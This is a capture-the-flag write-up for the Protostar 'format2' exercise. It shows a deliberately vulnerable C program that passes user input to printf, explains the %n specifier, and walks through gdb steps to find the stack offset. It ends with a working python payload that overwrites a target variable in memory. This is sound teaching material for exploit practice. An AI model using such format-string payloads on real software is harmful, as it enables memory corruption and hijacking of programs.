#### Protostar Format2 

##### About
This level moves on from format1 and shows how specific values can be written in memory.  
  
This level is at /opt/protostar/bin/format2

##### Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);
  printf(buffer);
  
  if(target == 64) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %d :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

Format string '%n' prints nothing, but writes number of characters successfully written so far into an integer pointer parameter.

##### Solution
```
$ objdump -t format2 | grep target
080496e4 g     O .bss   00000004              target

$ echo 'AAAA' > /tmp/payload

$ gdb format2
......
(gdb) disas vuln
Dump of assembler code for function vuln:
0x08048454 <+0>:    push   %ebp
0x08048455 <+1>:    mov    %esp,%ebp
0x08048457 <+3>:    sub    $0x218,%esp
0x0804845d <+9>:    mov    0x80496d8,%eax
0x08048462 <+14>:   mov    %eax,0x8(%esp)
0x08048466 <+18>:   movl   $0x200,0x4(%esp)
0x0804846e <+26>:   lea    -0x208(%ebp),%eax
0x08048474 <+32>:   mov    %eax,(%esp)
0x08048477 <+35>:   call   0x804835c <fget@plt>
0x0804847c <+40>:   lea    -0x208(%ebp),%eax
......
(gdb) b *0x0804847c
Breakpoint 1 at 0x0804847c: file format2/format2.c, line 13.
(gdb) r < /tmp/payload
Starting program: /opt/protostar/bin/format2 < /tmp/payload
Breakpoint 1, vuln() at format2/format2.c:13
(gdb) x/4x $esp
0xbffffb00:     0xbffffb10      0x00000200      0xb7fd8420      0xbffffb54
(gdb) x 0xbffffb10
0xbffffb10:     0x41414141
(gdb) p (0xbffffb10 - 0xbffffb00) / 4
$1 = 4
(gdb) quit

$ python -c 'print "\xe4\x96\x04\x08%4$n"' | ./format2
◆
target is 4 :(
$ python -c 'print "\xe4\x96\x04\x08%60x%4$n"' | ./format2
                                                         200
you have modified the target :)
```

##### Reference
<https://thesprawl.org/research/exploit-exercises-protostar-format/#format-2>  
<http://louisrli.github.io/blog/2012/08/29/protostar-format0/>
